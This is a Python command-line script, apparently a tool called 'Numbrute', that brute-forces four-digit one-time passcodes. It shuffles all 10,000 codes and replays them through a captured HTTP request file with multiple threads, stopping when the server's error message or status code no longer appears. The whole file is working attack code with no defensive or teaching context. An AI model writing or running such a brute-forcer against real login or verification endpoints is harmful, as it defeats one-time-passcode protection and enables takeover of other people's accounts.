from assist import Attack
import random
from concurrent.futures import ThreadPoolExecutor as TPE
from queue import Queue as Q
from sys import stdout
import argparse

def showProgress(nowTrying):
    stdout.write(f"\r\033[91;1mNow trying: {nowTrying} \033[0m")
    stdout.flush()

q = Q()
otpList = []

for num in range(10000):
    otp = str(num).zfill(4)
    otpList.append(otp)
for i in range(10000):
    random_otp = random.choice(otpList)
    q.put(random_otp)
    otpList.remove(random_otp)
    


import argparse

parser = argparse.ArgumentParser(description='Numbrute')

parser.add_argument('-f', '--file', type=str, required=True, help='Path to the file')
parser.add_argument('-e', '--error_message', type=str, help='Error message')
parser.add_argument('-c', '--error_code', type=int, help='status code of response where the error message is shown')
parser.add_argument('-t', '--threads', type=int, default=3, help='Number of threads')
parser.add_argument('-H', '--disable_https', action='store_true', default=False, help='Disable HTTPS')

args = parser.parse_args()

# Check if either error_message or error_code is provided
if not (args.error_message or args.error_code):
    parser.error('At least one of error_message or error_code must be provided.')


target = Attack(
    request_file_path=args.file,
    error_message=args.error_message,
    error_code=args.error_code,
    threads=args.threads,
    disable_https=args.disable_https
)
target.load_file()

def crack():
    while target.incorrect_num:
        num = q.get()
        target.try_num(num)
        showProgress(nowTrying=num)

with TPE(max_workers=target.threads) as executor:
    executor.submit(crack)
